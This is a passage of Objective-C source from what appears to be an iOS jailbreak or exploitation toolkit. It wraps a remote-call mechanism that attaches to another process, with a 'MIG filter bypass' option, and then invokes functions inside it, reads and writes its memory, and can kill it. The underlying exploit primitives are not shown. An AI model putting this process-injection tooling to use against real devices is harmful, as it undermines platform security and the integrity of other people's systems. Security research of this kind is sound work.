    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = init_remote_call_configured(
        processName, false, 1, nil);
    if (result != 0) abandon_remote_call();
    remote_call_pop_state(previous);
    return result == 0 ? self : nil;
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:firstExceptionTimeoutMS
              originalThreadOnly:originalThreadOnly
            bootstrapThreadCount:2
               bootstrapProvoker:nil];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
            bootstrapThreadCount:(int)bootstrapThreadCount
               bootstrapProvoker:(void (^)(void))bootstrapProvoker
{
    self = [super init];
    if (!self)
        return nil;

    memset(&_state, 0, sizeof(_state));
    _state.labClient.socketFD = -1;
    _state.success = true;
    _state.threadList = [NSMutableArray new];
    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : 120000;
    _state.stableExceptionTimeoutFloorMS = 10000;
    _state.originalThreadOnly = originalThreadOnly;

    const char *processName = process.UTF8String;
    if (!processName)
        return nil;

    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = init_remote_call_configured(
        processName, useMigFilterBypass, bootstrapThreadCount,
        bootstrapProvoker);
    if (result != 0) {
        abandon_remote_call();
    }
    remote_call_pop_state(previous);

    if (result != 0)
        return nil;

    return self;
}

- (void)dealloc
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    if (remote_call_has_local_state()) {
        destroy_remote_call();
    }
    remote_call_pop_state(previous);
}

- (uint64_t)taskAddr
{
    return _state.taskAddr;
}

- (uint64_t)trojanMem
{
    return _state.trojanMem;
}

- (int)pid
{
    return _state.pid;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                          functionAddress:(uint64_t)pcAddr
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_read(src, dst, size);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)remoteRead64:(uint64_t)src
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = remote_read64(src);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite:(uint64_t)dst from:(const void *)src size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write(dst, src, size);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite64:(uint64_t)dst value:(uint64_t)val
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write64(dst, val);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWriteString:(uint64_t)dst value:(const char *)str
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_writeStr(dst, str);
    remote_call_pop_state(previous);
    return result;
}

- (int)destroyRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = destroy_remote_call();
    remote_call_pop_state(previous);
    return result;
}

- (void)abandonRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    abandon_remote_call();
    remote_call_pop_state(previous);
}

- (BOOL)hasInFlightSyntheticCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = g_RC_syntheticCallInFlight;
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)deferTeardownForInFlightSyntheticCall
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL shouldSchedule = remote_call_has_local_state() &&
        g_RC_syntheticCallInFlight && !g_RC_deferredTeardownScheduled &&
        remote_call_target_identity_is_live();
    if (shouldSchedule) g_RC_deferredTeardownScheduled = true;
    remote_call_pop_state(previous);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    if (!shouldSchedule) return NO;

    // The submitted block strongly owns this session. In particular, dealloc
    // cannot destroy the receive right while the target is still returning
    // from the timed-out call. Polling in short slices also keeps unrelated
    // RemoteCall sessions from being locked out for a long target syscall.
    static dispatch_queue_t deferredQueue;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        deferredQueue = dispatch_queue_create(
            "com.cyanide.remotecall.deferred-teardown",
            DISPATCH_QUEUE_SERIAL);
    });
    RemoteCallSession *retainedSession = self;
    dispatch_async(deferredQueue, ^{
        @autoreleasepool {
            for (;;) {
                pthread_mutex_lock(&g_universal_ipc_mutex);
                RemoteCallState *saved = remote_call_push_state(
                    [retainedSession remoteCallStatePointer]);
                BOOL hasState = remote_call_has_local_state();
                BOOL targetLive = hasState &&
                    remote_call_target_identity_is_live();
                if (!hasState) {
                    remote_call_pop_state(saved);
                    pthread_mutex_unlock(&g_universal_ipc_mutex);
                    break;
                }
                if (!targetLive) {
                    printf("[RemoteCall] Deferred teardown target identity is gone; abandoning local state safely.\n");
                    abandon_remote_call_internal();
                    remote_call_pop_state(saved);
                    pthread_mutex_unlock(&g_universal_ipc_mutex);
                    break;
                }

                BOOL drained = remote_call_drain_in_flight_synthetic_call_internal(1000);
                int teardown = 0;
                if (drained && remote_call_has_local_state() &&
                    !g_RC_syntheticCallInFlight) {
                    teardown = destroy_remote_call_internal();
                }
                BOOL finished = !remote_call_has_local_state();
                remote_call_pop_state(saved);
                pthread_mutex_unlock(&g_universal_ipc_mutex);
                if (finished) {
                    printf("[RemoteCall] Deferred live-target teardown finished safely (result=%d).\n",
                           teardown);
                    break;
                }
                usleep(100000);
            }
        }
    });
    return YES;
}

- (RemoteCallTerminalDispatchStatus)dispatchSelfSIGKILLForExpectedPID:(int)expectedPID
                                                                  proc:(uint64_t)expectedProc
                                                                  task:(uint64_t)expectedTask
                                                                report:(RemoteCallTerminalDispatchReport *)reportOut
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    RemoteCallTerminalDispatchStatus status =
        remote_call_dispatch_self_sigkill(
            expectedPID, expectedProc, expectedTask, reportOut);
    remote_call_pop_state(previous);
    return status;
}

- (BOOL)hasLocalState
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_call_has_local_state();
    remote_call_pop_state(previous);
    return result;
}

- (RemoteCallState *)remoteCallStatePointer
{
    return &_state;
}

- (RemotePointer *)objectAtIndexedSubscript:(NSUInteger)address
{
    return [[RemotePointer alloc] initWithSession:self address:address];
}

@end

#define REMOTE_POINTER_DEFAULT_STRING_MAX 0x4000
#define REMOTE_POINTER_STRING_CHUNK 0x100

@implementation RemotePointer

- (instancetype)initWithSession:(RemoteCallSession *)session address:(uint64_t)address
{
    self = [super init];
    if (!self)
        return nil;

    _session = session;
    _address = address;
    return self;
}

- (BOOL)readTo:(void *)dst size:(uint64_t)size
{
    return [_session remoteRead:_address to:dst size:size];
}

- (BOOL)writeFrom:(const void *)src size:(uint64_t)size
{
    return [_session remoteWrite:_address from:src size:size];
}

- (BOOL)writeCString:(const char *)string
{
    return [_session remoteWriteString:_address value:string];
}

- (void)setString:(NSString *)string
{
    [self writeCString:string.UTF8String];
}

- (NSString *)string
{
    return [self stringWithMaxLength:REMOTE_POINTER_DEFAULT_STRING_MAX];
}

- (NSString *)stringWithMaxLength:(size_t)maxLength
{
    if (!_session || !_address || maxLength == 0)
        return nil;

    char *buf = (char *)calloc(maxLength + 1, 1);
    if (!buf)
        return nil;

    size_t copied = 0;
    while (copied < maxLength) {
        size_t chunk = REMOTE_POINTER_STRING_CHUNK;
        if (chunk > maxLength - copied)
            chunk = maxLength - copied;

        uint64_t current = _address + copied;
        size_t pageRemaining = (size_t)(PAGE_SIZE - (current & PAGE_MASK));
        if (chunk > pageRemaining)
            chunk = pageRemaining;

        if (![_session remoteRead:_address + copied to:buf + copied size:chunk]) {
            free(buf);
            return nil;
        }

        char *end = memchr(buf + copied, 0, chunk);
        if (end) {
            size_t length = (size_t)(end - buf);
            NSString *result = [[NSString alloc] initWithBytes:buf length:length encoding:NSUTF8StringEncoding];
            free(buf);
            return result;
        }

        copied += chunk;
    }

    NSString *result = [[NSString alloc] initWithBytes:buf length:maxLength encoding:NSUTF8StringEncoding];
    free(buf);
    return result;
}

- (void)setValue8:(uint8_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint8_t)value8
{
    uint8_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue16:(uint16_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint16_t)value16
{
    uint16_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue32:(uint32_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint32_t)value32
{
    uint32_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue64:(uint64_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint64_t)value64
{
    uint64_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

@end

void remote_call_with_session(RemoteCallSession *session, void (^block)(void))
{
    if (!block)
        return;

    if (!session) {
        block();
        return;
    }

    RemoteCallState *state = [session remoteCallStatePointer];
    RemoteCallState *previous = remote_call_push_state(state);
    @try {
        block();
    } @finally {
        remote_call_pop_state(previous);
    }
}

void remote_call_with_session_suppressing_result_logs(
    RemoteCallSession *session, void (^block)(void))
{
    if (!block)
        return;

    bool previous = g_RC_suppressResultLogs;
    g_RC_suppressResultLogs = true;
    @try {
        remote_call_with_session(session, block);
    } @finally {
        g_RC_suppressResultLogs = previous;
    }
}
